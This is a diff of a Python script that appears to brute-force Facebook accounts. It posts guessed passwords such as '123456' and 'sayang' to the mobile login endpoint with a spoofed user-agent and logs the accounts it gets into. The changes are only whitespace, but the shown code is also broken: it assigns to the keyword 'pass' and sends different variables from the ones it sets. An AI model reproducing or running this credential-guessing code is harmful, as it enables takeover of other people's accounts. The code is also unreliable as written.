@@ -279,7 +279,7 @@ def pilih_passxd():
                                                         cek.close()
                                                         cekpoint.append(user+pass2)
                                                 else:
-                                                        pass3 ='bismillah'
+                                                        pass3 = 'bismillah'
                                                         rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
                                                         xo = rex.content
                                                         if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -296,7 +296,7 @@ def pilih_passxd():
                                                                         cek.close()
                                                                         cekpoint.append(user+pass3)
                                                                 else:
-                                                                        pass='123456'
+                                                                        pass = '123456'
                                                                         rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
                                                                         xo = rex.content
                                                                         if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -313,7 +313,7 @@ def pilih_passxd():
                                                                                         cek.close()
                                                                                         cekpoint.append(user+pass4)   
                                                                                 else:
-                                                                                        pass='sayang'
+                                                                                        pass = 'sayang'
                                                                                         rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
                                                                                         xo = rex.content
                                                                                         if 'mbasic_logout_button' in xo or 'save-device' in xo:
